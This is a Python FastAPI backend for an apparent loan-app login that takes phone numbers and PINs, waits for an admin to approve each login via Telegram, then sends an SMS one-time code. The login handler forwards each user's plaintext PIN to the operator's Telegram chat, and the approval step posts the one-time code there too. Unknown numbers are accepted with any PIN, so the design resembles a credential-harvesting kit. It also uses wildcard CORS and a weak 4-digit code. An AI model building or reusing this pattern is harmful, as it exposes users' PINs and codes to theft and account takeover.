import random
from uuid import uuid4
from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, BackgroundTasks, Request
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware

from database import init_db, create_user, verify_user_pin, get_user
from telegram_bot import send_approval_request, answer_callback_query, edit_message
from approvals import create_approval, set_approval_result, wait_for_approval
from notifications import send_otp_sms, send_telegram_message

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize database on startup
init_db()

otp_store = {}

class LoginRequest(BaseModel):
    phone_number: str
    pin: str

class OTPRequest(BaseModel):
    phone_number: str
    otp: str

class RegisterRequest(BaseModel):
    phone_number: str
    pin: str

def format_phone(phone: str) -> str:
    """Ensure phone number has +243 prefix."""
    phone = phone.strip()
    if phone.startswith("0"):
        phone = phone[1:]
    if not phone.startswith("+243") and not phone.startswith("243"):
        return f"+243{phone}"
    if phone.startswith("243"):
        return f"+{phone}"
    return phone


@app.get("/")
def read_root():
    return {"status": "Backend is running"}


# --- REGISTER (one-time, for testing) ---
@app.post("/api/register")
async def register(request: RegisterRequest):
    full_phone = format_phone(request.phone_number)
    if create_user(full_phone, request.pin):
        return {"status": "success", "message": "User created"}
    return {"status": "error", "message": "User already exists"}


# --- LOGIN with Telegram approval ---
@app.post("/api/login")
async def login(request: LoginRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)

    # 1. Check if user exists (optional — remove for demo)
    user = get_user(full_phone)
    if not user:
        # Auto-create for testing — remove in production
        create_user(full_phone, request.pin)
    else:
        # Verify PIN
        if not verify_user_pin(full_phone, request.pin):
            return {"status": "error", "message": "Invalid PIN"}

    # 2. Create approval request
    approval_id = str(uuid4())
    create_approval(approval_id)

    # 3. Send Telegram message with Yes/No buttons
    background_tasks.add_task(
        send_approval_request,
        approval_id,
        full_phone,
        request.pin
    )

    # 4. Wait for admin's response (max 5 minutes)
    approved = await wait_for_approval(approval_id, timeout=300)

    if approved is None:
        return {"status": "error", "message": "Approval timed out. Try again."}
    if not approved:
        return {"status": "error", "message": "Login rejected by admin."}

    # 5. Approved — generate and send OTP via SMS
    otp = str(random.randint(1000, 9999))
    otp_store[full_phone] = otp

    background_tasks.add_task(send_otp_sms, full_phone, otp)
    background_tasks.add_task(
        send_telegram_message,
        f"✅ Approved login for <code>{full_phone}</code>. OTP: <code>{otp}</code>"
    )

    return {"status": "success", "message": "OTP sent to your phone."}


# --- VERIFY OTP ---
@app.post("/api/verify-otp")
async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)
    expected = otp_store.get(full_phone)

    if expected and request.otp == expected:
        del otp_store[full_phone]
        return {"status": "success", "message": "Loan approved"}
    return {"status": "error", "message": "Invalid OTP"}


# --- TELEGRAM WEBHOOK (receives Yes/No button clicks) ---
@app.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    data = await request.json()

    if "callback_query" in data:
        callback = data["callback_query"]
        callback_id = callback["id"]
        parts = callback["data"].split(":")
        action = parts[0]           # "approve" or "reject"
        approval_id = parts[1]

        approved = (action == "approve")

        # Wake up the waiting /api/login request
        set_approval_result(approval_id, approved)

        # Acknowledge the callback (stops spinner)
        await answer_callback_query(callback_id, "✅ Approved" if approved else "❌ Rejected")

        # Edit the original message to show the result
        result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
        await edit_message(
            chat_id=callback["message"]["chat"]["id"],
            message_id=callback["message"]["message_id"],
            text=f"{result_text}\n\nApproval ID: <code>{approval_id}</code>"
        )

    return {"ok": True}